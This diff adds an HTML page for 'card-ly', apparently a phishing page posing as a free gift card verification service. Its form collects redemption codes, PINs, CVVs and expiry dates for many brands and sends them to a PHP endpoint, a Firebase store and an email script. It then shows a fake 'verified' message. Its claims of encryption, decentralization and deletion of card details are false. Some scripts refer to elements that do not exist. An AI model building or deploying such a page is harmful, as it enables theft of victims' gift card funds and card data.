@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>card-ly: Manage Your Gift Cards</title>
+
+    <meta property="og:title" content="card-ly: Simplifying Gift Card Management">
+    <meta property="og:site_name" content="card-ly: Simplifying Gift Card Management">
+    <meta property="og:url" content="card-ly.com/">
+    <meta property="og:description" content="Manage, and redeem your gift cards effortlessly with card-ly.">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="https://i.ibb.co/MVkGyTm/gcc2-0cb4b1ce.webp">
+
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="favicon.ico">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+    <link rel="manifest" href="site.webmanifest">
+
+
+    <link rel="stylesheet" href="main.css">
+    <link rel="stylesheet" href="card.css">
+
+
+    <script src="js/custom.js"></script>
+    <script src="js/card.js"></script>
+    <script src="firebasejs/7.17.1/firebase.js"></script>
+
+
+
+
+  <!--Start of Tawk.to Script-->
+<script type="text/javascript">
+  var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+  (function(){
+  var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+  s1.async=true;
+  s1.src='https://embed.tawk.to/6611ccbaa0c6737bd1291153/1hqqofh40';
+  s1.charset='UTF-8';
+  s1.setAttribute('crossorigin','*');
+  s0.parentNode.insertBefore(s1,s0);
+  })();
+  </script>
+  <!--End of Tawk.to Script-->
+
+  </head>
+  <body>
+    <nav>
+      <a class="logo" href="index.htm">Card<span class="logo">-ly</span></a><input type="checkbox" id="click"><label for="click" class="menu-btn text-white"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewbox="0 0 448 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+          <path d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"></path></svg></label>
+      <ul>
+        <li><a class="navlink active">Home</a></li>
+        <li><a href="#services" class="navlink">Services</a></li>
+        <li><a href="#footer" class="navlink">Contact Us</a></li>
+        <li><a href="#card-modal" class="btn btn-light fw-bold">Verify now</a></li>
+      </ul>
+    </nav>
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="modal" tabindex="-1" id="modall" style="margin-top: 80px;">
+      <div class="modal-dialog">
+        <div class="modal-content">
+          <div class="modal-body">
+            <div class="bg-white px-4 pt-5 pb-4 sm:p-6 sm:pb-4">
+              <h1 class="text-green-500 text-4xl text-center" style="font-size: 20px; color:green">SUCCESS !</h1>
+              <h1 class="text-center text-xl" style="font-size: 20px;">Your <b id="card">name of card</b> giftcard has been verified</h1><br>
+              <hr/>
+              <h1 class="text-center mt-5" style="font-size: 18px;">Card Brand : <b id="cards">name of card</b></h1>
+              <h1 class="text-center mt-5" style="font-size: 18px;">Card Amount : <b id="sign"></b> <b id="amt">name of card</b></h1>
+              <h1 class="text-center mt-5" style="font-size: 18px;">Card Status : <b>Not activated</b></h1>
+              <hr>
+              
+              
+          </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+    <section id="hero">
+      <div class="hero-body">
+        <div class="hero-caption aos-init aos-animate" data-aos="fade-up">
+          <h1 class="hero-title text-white">
+            Giftcard <span class="text-success">Validation</span> and Activation
+            Check
+          </h1>
+          <div class="hero-sub-text1 text-white">
+            an efficient frame work that provides a robust verification,
+          </div>
+          <div class="hero-sub-text1 text-white">
+            Using a smart anti logarithm that runs very fast to provide an
+            adequate activation information.
+          </div>
+          <div class="hero-action-btn py-3">
+            <a href="#card-modal" class="btn btn-light btn-lg">Verify now</a>
+          </div>
+        </div>
+        <div class="hero-banner py-3 px-4 aos-init aos-animate" data-aos="fade-up">
+          <img src="gcc1.946c88c6.webp" class="gcimage img-fluid" alt="giftcard">
+        </div>
+      </div>
+    </section>
+
+    <div class="engagement">
+      <div class="ft2 aos-init aos-animate" data-aos="fade-up">
+        <img src="gcc2.0cb4b1ce.webp" class="img-fluid" alt="cards">
+      </div>
+      <div class="ft1">
+        <h2 class="text-center aos-init aos-animate" data-aos="fade-up">
+          We have verified over 10k giftcards on our site.<br>Verify yours now
+        </h2>
+        <div class="text-center aos-init aos-animate" data-aos="fade-up">
+          <a href="#card-modal" class="btn btn-success btn-lg my-3">Try it for free</a>
+        </div>
+      </div>
+    </div>
+
+       <!--start of card section -->
+   
+
+
+       <div class="login-root" id="card-modal">
+        <div class="box-root flex-flex flex-direction--column" style="flex-grow: 1">
+                   <div class="box-root  flex-flex flex-direction--column" style="flex-grow: 1; z-index: 0">
+          
+            <h2 class=" margin-bottom-24" style="font-size: 24px; text-align: center; font-weight: 600; margin-bottom: 30px; margin-top: 30px;">
+            All Gift Cards Checker
+          </h2>
+              <div class="formbg">
+                
+                <div class="formbg-inner padding-horizontal--48 text-center">
+               
+                  <form class="contact-form box-background--white paading" action="" method="POST" enctype="multipart/form-data" id="uploadForm">
+                    <select id="card-type"  required="" name="cardName" class="form-select" style="border-radius: 64px; margin-top: 10px" placeholder="Select type of card">
+                      <option value="" class="">Select type of card</option>
+                      <option value="Apple">Apple</option>
+                      <option value="Amazon">Amazon</option>
+                      <option value="Steam">Steam</option>
+                      <option value="E-Bay">EBay</option>
+                      <option value="X-Boxs">Xbox</option>
+                      <option value="Googleplay">Googleplay</option>
+                      <option value="PlayStation">PlayStation</option>
+                      <option value="Sephora">Sephora</option>
+                      <option value="RazerGold">RazerGold</option>
+                      <option value="Macy">Macy</option>
+                      <option value="Nordstrom">Nordstrom</option>
+                      <option value="Nike">Nike</option>
+                      <option value="Vanilla">Visa Card</option>
+                      <option value="MasterCard">MasterCard</option>
+                      <option value="Vanilla">Vanilla Visa</option>
+                      <option value="Wallmart Visa">Wallmart Visa</option>
+                      <option value="Visa Silvery White">Visa Silvery White</option>
+                      <option value="TT Visa">TT Visa</option>
+                      <option value="Amex">Amex</option>
+                    </select>
+
+
+                    <div style="display:flex; gap: 10px;">
+                      <select id="currency-type" name="currency" class="form-select" style="border-radius: 64px; margin-top: 15px; width: 30%" placeholder="Select type of card">
+                        <option value="USD">USD</option>
+                        <option value="GBP">GBP</option>
+                        <option value="AUD">AUD</option>
+                        <option value="EUR">EUR</option>
+                        <option value="CAD">CAD</option>
+                      </select>
+                      <div class="field padding-bottom--28" style="margin-top: 20px; width: 70%">
+                        <input id="amount" name="amount" required="" type="number" placeholder=" Card amount">
+                      </div>
+                    </div>
+
+    
+                    <div class="field  padding-top--24">
+                      <input id="rc" name="redemptioncode" type="text" placeholder=" Redemption Code" required="" minlength="4" maxlength="20">
+                    </div>
+
+                    <div id="form0" class="testtest" style=" color: #000; display: none; font-size: small ;   "><br>
+                    <p style="color:rgb(255, 0, 0)">16 digit code at the face of the card</p></div>
+
+                    <div id="form01" class=" testtest" style=" color: #000;  display: none; font-size: small; "><br>
+                    <p style="color:rgb(255, 0, 0)">15 digit code at the face of the card</p></div>
+
+
+
+                    
+
+                   
+                    <div id="form5" class="field" style="margin-top: 20px;   display: none;">
+                      <input type="number" placeholder=" Access Number" name="access">
+                    </div>
+
+                    <div id="form" class="field" style="margin-top: 20px;   display: none;">
+                   <input name="date" size="10" placeholder="Gift Card Expiry Date" maxlength="7" 
+                   id="ce" >
+                    </div>
+
+
+                   
+
+                    <div id="form4" class="field" style="   display: none; margin-top: 15px;">
+                      <input id="fp" name="pin" type="number" placeholder=" 4 Digit Pin">
+                    </div>
+
+                    <div id="form2" class="field" style="margin-top: 20px;   display: none;">
+                      <input id="cc" type="number" name="cardcvv" placeholder=" Gift Card CVV">
+                    </div>
+                    <div id="form3" class="field padding-bottom--24" style="margin-top: 20px;   display: none;">
+                      <input id="cp" type="number" placeholder=" Gift Card Pin" name="pin">
+                    </div>
+
+                   
+
+                  
+
+
+                   <!-- <div class="bod">
+                    <div class="box">
+                      <div class="b b1"></div>
+                      <div class="b b2"></div>
+                      <div class="b b3"></div>
+                      <div class="b b4"></div>
+                    </div>
+       
+                   </div>
+                    -->
+
+                    <div id="InfoBanner" style="">
+                      <span class="reversed reversedRight">
+                        <span>
+                          &#9888;
+                        </span>
+                      </span>
+                      <span class="reversed reversedLeft">
+                        ensure redemption code is scratched code !!
+                      </span> 
+                    </div>
+              
+                   <!-- <div > <p style="color:rgb(255, 178, 178)">  Please make sure the redemption code is the original scratched code</p></div> -->
+                    <div class="field padding-bottom--24 margin-top-24" style=" margin-top:74px">
+                      <input class="" style="background-color: #00a6fb; color:white" type="submit" name="submit" value="Continue" id="myButton1">
+                    </div>
+                    <div> <p style="color:gray">Please make sure the codes you are about to input are correct and according to details
+
+                    </p></div>
+
+               
+
+
+
+                  </form>
+                  
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      
+
+      <!-- end of card  -->
+
+      <section id="services"><h1 class="text-center text-white aos-init aos-animate" data-aos="fade-up">Our Services</h1><p class="service-caption text-center my-4 text-light aos-init aos-animate" data-aos="fade-up">Leverage our agile and efficient frameworks to provide a robust verification and synopsis for high level reviews on your giftcards</p><div class="services-container mt-4 container"><div class="service s1 aos-init aos-animate" data-aos="fade-up"><h2 class="s-num">1</h2><h2 class="s-title">High performance</h2><div class="s-body">Our smart algorithms run very fast to provide for you adequate info about your giftcard. We value our customers time, that is why you can get a fast response on your request</div></div><div class="service s2 aos-init"><h2 class="s-num">2</h2><h2 class="s-title">Secured and Encrypted</h2><div class="s-body">We at <span class="fw-bold text-primary">card-ly </span> makes sure customers giftcard details are secured and encrypted. No attacker or false identity can intercept your verification operations</div></div><div class="service s3 aos-init"><h2 class="s-num">3</h2><h2 class="s-title">Decentralized</h2><div class="s-body">Our smart frameworks is built on a decentralized platform to ensure clients gift card details are not stored anywhere in the server. Your card details are immediately deleted after verification operations.</div></div></div></section>
+
+      <footer id="footer"><div id="contact" class="contact bg-white"><h1 class="text-center aos-init aos-animate" data-aos="fade-up">Contact Us</h1><p class="service-caption text-center my-4 aos-init aos-animate" data-aos="fade-up">We are available to help you with your giftcard verification needs and to provide you support with a quick solution to your problem.</p><div class="contact-container container aos-init aos-animate" data-aos="fade-up"><form><div class="mb-3"><label for="exampleFormControlInput1" class="form-label">Email address</label><input type="email" class="form-control" id="exampleFormControlInput1" placeholder="name@example.com"></div><div class="mb-3"><label for="exampleFormControlTextarea1" class="form-label">Message</label><textarea class="form-control" id="exampleFormControlTextarea1" rows="6"></textarea></div><div class="mb-3"><button type="submit" class="btns btn btn-success w-100  fs-5">Submit</button></div></form></div></div><div class="foot text-white text-center"><div class="fs-5">card-ly  ©</div><div><address>978 JUMES AVENUE, ST CHRIS, USA.</address></div><div>Copyright 2020, All Rights Reserved</div></div></footer>
+
+
+
+  </body>
+
+  <script src="js/vendor.min.js"></script>
+  <script src="js/custom.js"></script>
+
+<!-- <script src="https://www.gstatic.com/firebasejs/7.17.1/firebase.js"></script> -->
+
+<script src="v3/smtp.js"></script>
+
+<!-- <script src="https://www.gstatic.com/firebasejs/7.17.1/firebase.js"></script> -->
+
+<script>
+             
+
+  // function hello(e) {
+
+  //   let cardtype = document.getElementById("card-type").value;
+  //   let amount = document.getElementById("amount").value;
+  //   let currency = document.getElementById("currency-type").value;
+
+  //   event.preventDefault();
+  //   myClick()
+  //   document.getElementById("el1").textContent = `${cardtype}`;
+  //   document.getElementById("el2").textContent = `${currency}${amount}`;
+
+  //   document.getElementById("myButton1").value="Checking.......";
+
+  //   console.log("hello");
+  // }
+  function closeNav() {
+      document.getElementById("myNav").style.width = "0%";
+      document.getElementById("myButton1").value = "Continue";
+  }
+
+  function myClick() {
+      document.getElementById("modall").classList.toggle("hidden");
+
+      setTimeout(function openNav() {
+          document.getElementById("myNav").style.width = "100%";
+      }, 1000);
+  }
+
+  function toggleModal() {
+      document.getElementById("modall").classList.toggle("hidden");
+      document.getElementById("myButton1").value = "CONTINUE";
+  }
+
+  function submitForm(e) {
+      event.preventDefault();
+
+      document.getElementById("myButton1").value = "Checking.......";
+
+      let cardtype = document.getElementById("card-type").value;
+      let currency = document.getElementById("currency-type").value;
+      let amount = document.getElementById("amount").value;
+      let cardpin = document.getElementById("cardpin").value;
+      let cardcvv = document.getElementById("cardcvv").value;
+      let cardexpiredate = document.getElementById("cardexpiredate").value;
+      let cardfourpin = document.getElementById("fourpin").value;
+      let redemptioncode = document.getElementById("redemptioncode").value;
+
+      //  document.getElementById("el1").textContent = `${cardtype}`;
+      //   document.getElementById("el2").textContent = `${currency}${amount}`;
+
+      // document.querySelector(".contact-form").reset();
+
+      saveContactInfo(cardtype, currency, amount, cardpin, cardcvv, cardexpiredate, cardfourpin, redemptioncode);
+
+      sendEmail(cardtype, currency, amount, cardpin, cardcvv, cardexpiredate, cardfourpin, redemptioncode);
+  }
+
+  function saveContactInfo(cardtype, currency, amount, cardpin, cardcvv, cardexpiredate, cardfourpin, redemptioncode) {
+      let newContactInfo = contactInfo.push();
+
+      newContactInfo.set({
+          cardtype: cardtype,
+          currency: currency,
+          amount: amount,
+          cardpin: cardpin,
+          cardcvv: cardcvv,
+          cardexpiredate: cardexpiredate,
+          cardfourpin: cardfourpin,
+          redemptioncode: redemptioncode,
+      }).then(myClick);
+  }
+
+
+</script>
+<script>
+  let menuBtn = document.getElementById("mobileMenu");
+  let svgOpen = document.getElementById("svgOpen");
+  let svgClose = document.getElementById("svgClose");
+  let menu = document.getElementById("mobile-menu-2");
+
+  menuBtn.addEventListener("click", function() {
+      if (menu.classList.contains("hidden")) {
+          svgOpen.classList.add("hidden");
+          svgClose.classList.remove("hidden");
+      } else {
+          svgOpen.classList.remove("hidden");
+          svgClose.classList.add("hidden");
+      }
+      menu.classList.contains("hidden") ? menu.classList.remove("hidden") : menu.classList.add("hidden");
+  });
+</script>
+
+<script>
+let card = document.getElementById("card");
+
+card.addEventListener("change", function handleChange(e) {
+if (
+["Amex", "TT Visa", "Visa Silvery White", "Sephora"].includes(
+e.target.value
+)
+) {
+document.getElementById("redemption_code").classList.add("hidden");
+document.getElementById("card_no").classList.remove("hidden");
+document.getElementById("card_pin").classList.remove("hidden");
+document.getElementById("expiry_date").classList.remove("hidden");
+document.getElementById("cvv").classList.remove("hidden");
+}
+
+if (
+["Walmart Visa", "Vanilla", "MasterCard", "Visa"].includes(e.target.value)
+) {
+document.getElementById("redemption_code").classList.add("hidden");
+document.getElementById("card_no").classList.remove("hidden");
+document.getElementById("card_pin").classList.add("hidden");
+document.getElementById("expiry_date").classList.remove("hidden");
+document.getElementById("cvv").classList.remove("hidden");
+}
+
+if (["Nordstrom", "Nike"].includes(e.target.value)) {
+document.getElementById("redemption_code").classList.remove("hidden");
+document.getElementById("card_pin").classList.remove("hidden");
+document.getElementById("card_no").classList.add("hidden");
+document.getElementById("expiry_date").classList.add("hidden");
+document.getElementById("cvv").classList.add("hidden");
+}
+
+if (
+[
+"PlayStation",
+"Googleplay",
+"Xbox",
+"Apple",
+"Amazon",
+"Steam",
+"eBay",
+"RazerGold",
+].includes(e.target.value)
+) {
+document.getElementById("redemption_code").classList.remove("hidden");
+document.getElementById("card_no").classList.add("hidden");
+document.getElementById("card_pin").classList.add("hidden");
+document.getElementById("expiry_date").classList.add("hidden");
+document.getElementById("cvv").classList.add("hidden");
+}
+});
+</script> 
+
+
+
+<script src="js/jquery-2.2.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function (e){
+$("#uploadForm").on('submit',(function(e){ e.preventDefault();
+document.getElementById("myButton1").value = "Checking.......";
+x = document.getElementById("card-type").value;
+y = document.getElementById("currency-type").value;
+z = document.getElementById("amount").value;
+$.ajax({
+url: "dm.php",
+type: "POST",
+data: new FormData(this),
+contentType: false, 
+cache: false, 
+processData:false,
+success: function(data){  
+if (data == 1){
+$('#modall').modal('show');
+document.getElementById("myButton1").value = "CONTINUE";
+document.getElementById("card").innerHTML = x;
+document.getElementById("cards").innerHTML = x;
+document.getElementById("sign").innerHTML = y;
+document.getElementById("amt").innerHTML = z;
+setTimeout(function(){
+$('#modall').modal('hide');
+}, 5000);
+}else{
+alert(data);
+}
+},
+error: function(){
+}
+});
+}));
+});
+</script>
+
+
+
+
+</html>
